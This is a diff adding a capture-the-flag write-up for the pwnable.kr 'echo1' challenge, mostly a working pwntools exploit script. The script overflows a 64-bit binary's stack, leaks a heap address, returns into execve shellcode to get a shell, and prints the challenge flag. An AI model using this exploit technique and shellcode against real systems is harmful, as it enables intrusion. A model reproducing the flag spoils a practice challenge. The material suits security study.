@@ -111,6 +111,43 @@ it eats our shellcode too , so to solve this there are 2 ways  <br> <br>
 		2) pathch 15'th byte to leave ; but now ecx+4 (argv[1]) will be some bytes so sh interprets as file to execute so create a symbolic link of that bytes to a.sh file 
 		
 ##### flag : Sorry for blaming shell-strom.org :) it was my ignorance!
+
+
+#### echo1
+This one was 64 bit binary with lot of fake vulnerablity  to trick us ,there was not enough gadget to play with ... so u make one ,but all u had to do is prepare a 4 byt shellcode (to make rdi pointing to heap) which is stored at .bss section , and leak heap addr and ret2heap && voila the shell !!!!
+
+```python
+from pwn import * 
+context.bits = 64
+puts = 0x400630
+o= 0x602098
+id_ = 0x6020a0
+echo1=0x400818
+shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+#p = process('./echo1')
+p = remote('pwnable.kr',9010)
+p.recvuntil(':')
+payload = "\x5F\xC3"+"A"*10
+p.sendline(payload)
+p.recvuntil('>')
+p.sendline('1')
+p.recvline()
+payload = "A"*40+pack(id_)+pack(o)+pack(puts)+pack(echo1)
+p.sendline(payload)
+s= p.recvlines(3)
+context.bits = len(s[2])*8
+heap_leak = unpack(s[2])
+shellcode_addr = heap_leak+48
+print "[+] Heap leak: "+hex(heap_leak)
+p.recvline()
+context.bits = 64
+payload = "\x90"*(40-len(shellcode))+shellcode+pack(shellcode_addr)
+p.sendline(payload)
+p.recvlines(2)
+p.interactive()
+```
+
+##### flag : H4d_som3_fun_w1th_ech0_ov3rfl0w
 		
 
 
